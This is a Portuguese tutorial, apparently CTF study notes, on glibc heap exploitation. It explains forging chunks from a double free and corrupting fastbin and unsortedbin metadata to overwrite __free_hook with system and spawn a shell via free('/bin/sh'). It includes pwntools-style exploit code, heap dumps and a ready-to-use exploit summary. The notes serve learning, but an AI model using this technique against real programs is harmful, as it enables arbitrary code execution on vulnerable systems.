- [Double Free como Dangling Pointer](#double-free-como-dangling-pointer)
  - [Free em um Fastbin](#free-em-um-fastbin)
- [Fast+Unsorted Corromper free_hook](#fastunsorted-corromper-free_hook)
  - [Ataque](#ataque)
  - [Resumo](#resumo)

# Double Free como Dangling Pointer
Expandindo a definição de um double free como um pointer que nao 
foi zerado (e pode ser usado para chamar free em um endereço). 

Porem, como em free o heap se movimenta (consolidações e etc), nos 
podemos considerar o `double free` como um `free em um endereço arbitrário`.

Assim, nos podemos moldar o heap, colocando um chunk arbitrário 
naquele endereço, e assim chamar free nele

## Free em um Fastbin 

Por exemplo, vamos supor que o programa nao nos permite usar 
fastbins. Com um double free, voce pode forjar um fastchunk 
naquele endereço, e ao chamar free (por meio do double free), voce 
terá gerado um fastchunk legitimo.

```py
chunk_A = malloc(0x88) # qualquer size > 0x80 
chunk_B = malloc(0x88) # mesma coisa

free(chunk_A)
free(chunk_B)


  0x0000000000000000	0x0000000000021001	 <-- Top chunk

o heap esta vazio, mas o programa tem um double free, então o 
pointer para, por exemplo, o chunk_B pode ser free de novo

assim, se forjarmos um chunk com o size no mesmo endereço que o 
size do chunk_B, temos um free em um chunk de tamanho arbitrário

eu vou edit(chunk_B, "BBBBB") pra ficar mais fácil de 
identificar, mas voce nao precisa. 

  0x0000000000000000	0x0000000000021001
  0x00007f9e2c144b58	0x00007f9e2c144b58
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000090	0x0000000000000090 <- aqui
  0x4242424242424242	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000

nos podemos fazer isso tanto com um UAF para dar write em um chunk 
falso, um overflow a partir de outro chunk ou remaindering

como os outros métodos sao intuitivos, so vou explicar remaindering

voce quer criar um chunk de tamanho X (ex: 0x20)
voce comeca alocando um chunk de tamanho 0x80+X

chunk_C =  malloc(0x80 + 0x20)
chunk_top = malloc (0x88) # Prevenir consolidação com o top
free(chunk_C)

	0x0000000000000000	0x00000000000000b1 <-- chunk_C
  0x00007efc47c42b58	0x00007efc47c42b58 unsortedbin[all][0]
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000090	0x0000000000000090 chunk_B antigo
  0x4242424242424242	0x0000000000000000
  0x0000000000000000	0x0000000000000091 <-- chunk_top
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ee1
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ec1 <-- Top chunk

agora nos pegamos um chunk que va causar remaindering no chunk_C
e criar um chunk de tamanho X com o size na mesma posição do 
size antigo do chunk_B

chunk_D = malloc(0x88)

  0x0000000000000000	0x0000000000000091 <-- chunk_D
  0x00007efc47c42b58	0x00007efc47c42b58
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000 BBBBB substituído por pointers
  0x0000000000000090	0x0000000000000021 <-- unsortedbin[all][0]
  0x00007fcbb3712b58	0x00007fcbb3712b58 MESMO ENDEREÇO DO CHUNK_B
  0x0000000000000020	0x0000000000000090 <-- chunk_top
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ee1
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ec1 <-- Top chunk

agora, o pointer do chunk_B aponta para um size 0x20

para testar, podemos dar free nele e consequentemente criar um 
fastbin

OBS: se lembre de tirar esse teste depois, pois nos precisamos 
fazer mais coisa antes para termos um exploit funcional

  0x0000000000000000	0x0000000000000091
  0x00007efc47c42b58	0x00007efc47c42b58
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000090	0x0000000000000021 <-- fastbins[0x20][0], unsortedbin[all][0]
  0x0000000000000000	0x00007fcbb3712b58 1 pointer = null
  0x0000000000000020	0x0000000000000090 <-- chunk_top
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ee1
  0x0000000000000000	0x0000000000000000
  0x0000000000000000	0x0000000000020ec1 <-- Top chunk

então, ate agora temos
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

free(chunk_A)
free(chunk_B)

chunk_C = malloc(0x80 + 0x20) # o chunk gerado sera de size 0x20
chunk_TOP = malloc(0x88)
free(chunk_C)

chunk_D = malloc(0x88) # remainder
# free(chunk_B) # checar double free
```
# Fast+Unsorted Corromper free_hook
Nos nao podemos usar um fastbin ataque contra o __free_hook

```x86asm
pwndbg> find_fake_fast &__malloc_hook
FAKE CHUNKS
Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7faf95b38acd
prev_size: 0xaf95b34f00000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0xaf957e10d0000000
bk_nextsize: 0x7f

pwndbg> find_fake_fast &__free_hook
FAKE CHUNKS
```

Porem, se usarmos o write do parcial unlink dos 
unsortedbins em um endereço **ANTES** do __free_hook (ou algum 
outro hook interessante), nos vamos escrever `7f12345678`

Porem, esse valor nao é muito util para um size. Porem se nos 
mirarmos com um offset nao múltiplo de 16, e separarmos o endereço:
```
0000000000 7f12345678  Inútil

0012345678 000000007f  Util: Fastbin 0x70
```

No caso do __free_hook vários funcionam, porem esse offset é o 
mais proximo: 
> unsorted = libc.sym.__free_hook - 0x23

E o endereço do chunk falso:

> fast = libc.sym.__free_hook - 0x16

```x86asm
pwndbg> find_fake_fast &__free_hook 
FAKE CHUNKS
Fake chunk | Free chunk (fastbins) | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7f825ea93772
prev_size: 0x825ea91b58000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```
## Ataque

Voce ira precisar corromper os metadados de um `free fast 0x70` e um `free unsorted`

Assim para simplificar, vamos assumir a seguinte configuração do heap:
```
 ___________  Fastbin 0x70 (Free)
|           | 
|___________|
|           | Unsorted Bin (Free)
|___________| 
```
E nos possuímos um UAF que no fast que nos permite dar um overflow ate o 
unsorted

```py
UAF(flat(#                       unsorted | fast
    libc.sym.__free_hook - 0x16,#         | fd
    b"R"*8*12,#                           | pad
    0x21,#                           size |
    0,#                                fd |
    libc.sym.__free_hook - 0x23,#      bk |
))
```

```x86asm
0x0000000000000000	0x0000000000000071	........q.......	 <-- fastbins[0x70][0]
0x00007f2208207772	0x5252525252525252	rw ."...RRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x5252525252525252	RRRRRRRRRRRRRRRR
0x5252525252525252	0x0000000000000021	RRRRRRRR!.......	 <-- unsortedbin[all][0]
0x0000000000000000	0x00007f2208207765	........ew ."...
```

Agora basta alocar o unsortedbin, causando o unsorted bin unlink

> malloc(0x18)

```x86asm
pwndbg> find_fake_fast &__free_hook 
FAKE CHUNKS
Fake chunk | Free chunk (fastbins) | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7f2208207772
prev_size: 0x2208205b58000000
size: 0x7f
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00
```

Em seguida, alocar o fast 
> malloc(0x68) # consumir

> chunk_hook = malloc(0x68) # __free_hook

E pronto, agora basta corromper o free hook

> `edit`(`chunk_hook`, b`"\0"`*`6` + `p64`(`libc.sym.system`))

Assim, chamando:
```py
free( p64( next( libc.search(b"/bin/sh\x00"))))

ou caso em um ctf, aonde voce so consegue passar o index de um chunk
para ser free... basta colocar /bin/sh como a primeira coisa no data 

edit(chunk_X, b"/bin/sh\x00")
free(chunk_X)

Assim, por trás dos panos vira: free(pointer /bin/sh)
```
## Resumo

```py
UAF(flat(#                       unsorted | fast
    libc.sym.__free_hook - 0x16,#         | fd
    b"R"*8*12,#                           | pad
    0x21,#                           size |
    0,#                                fd |
    libc.sym.__free_hook - 0x23,#      bk |
))

malloc(0x18) # Aloca: unsortedbin attack
malloc(0x68) # consumir: fast 0x70

chunk_hook = malloc(0x68) # __free_hook

edit(chunk_hook, b"\0"*6 + p64(libc.sym.system))

edit(chunk_X, b"/bin/sh\x00") # trigger
free(chunk_X)
```